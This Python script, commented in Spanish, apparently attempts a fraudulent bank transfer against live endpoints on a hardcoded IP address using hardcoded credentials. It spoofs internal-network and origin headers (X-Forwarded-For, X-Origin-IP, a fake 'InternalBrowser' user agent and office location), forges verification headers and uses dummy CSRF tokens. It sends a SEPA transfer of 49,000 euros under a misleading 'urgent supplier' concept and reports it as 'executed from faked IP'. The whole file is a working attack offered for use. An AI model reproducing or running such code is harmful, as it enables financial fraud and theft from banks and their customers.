import requests

# === URLs reales de operación ===
CHALLENGE_URL = "http://80.78.30.242:9181/api/challenge"
TRANSFER_ENDPOINT = "http://80.78.30.242:9181/api/send-transfer"
STATUS_CHECK = "http://80.78.30.242:9181/api/status-transfer"

# === Credenciales ===
USERNAME = "493069k1"
PASSWORD = "bar1588623"

# --- Creamos una sesión persistente ya con headers del sistema interno del banco ---
session = requests.Session()
session.headers.update({
    "Host": "api.coretransapi.com",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 (InternalBrowser)",
    "Accept": "text/xml,application/xml,application/xhtml+xml,application/json",
    "Accept-Language": "es;q=0.9,en;q=0.5",
    "X-Origin-IP": "192.168.1.10",
    "X-Forwarded-For": "192.168.1.10",
    "X-Requested-With": "XMLHttpRequest",
    "X-Location": "MainOfficeMadrid",
    "Sec-Ch-Ua": '"Brave";v="122", "Chromium";v="122", "Not=A?Brand";v="24"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"Linux"' 
})

# === Reciclamos sesión del script 00, o inyectamos cookies dummy si ya las tenemos ===
# session.cookies.set('sessionid', 'dummy12345sessión')

# === Paso 1: Challenge inicial (a veces comprueban token de sesión activa)
challenge_data = {"user": USERNAME}
challenge_response = session.post(CHALLENGE_URL, json=challenge_data)

if challenge_response.status_code in [200, 201]:
    print("[+] Challenge aceptado. Token interno activo:", challenge_response.text)
    # Recogemos el token si hay algún tipo de token-challenge extra
    internal_token = challenge_response.json().get("challenge")

    # === Paso 2: Realizar transferencia ===
    payload = {
        "iban_origen": "ES12345678901234567890",
        "iban_destino": "ES98765432109876543210",
        "monto": 49000.00,
        "concepto": "Traspaso proveedor - operación urgente",
        "token": internal_token if internal_token else "dummytoken",
        "csrfmiddlewaretoken": "dummycsrf"
    }

    transfer_headers = {
        **session.headers,
        "Content-Type": "application/json; charset=UTF-8",
        "X-Session-Verified": "1",
        "X-Challenge-Validated": internal_token
    }

    transfer_response = session.post(TRANSFER_ENDPOINT, json=payload, headers=transfer_headers)
    
    print("[+] Transferencia SEPA ejecutada desde IP fingida:")
    print("Status:", transfer_response.status_code)
    print("Respuesta:", transfer_response.text)

    # === Paso opcional: verificar en la API de status ===
    status_request = session.post(STATUS_CHECK, json={"token": internal_token})
    print("\nStatus de la transferencia:", status_request.text)

else:
    print("[-] Algo falló en el challenge.")
    print("Respuesta:", challenge_response.text)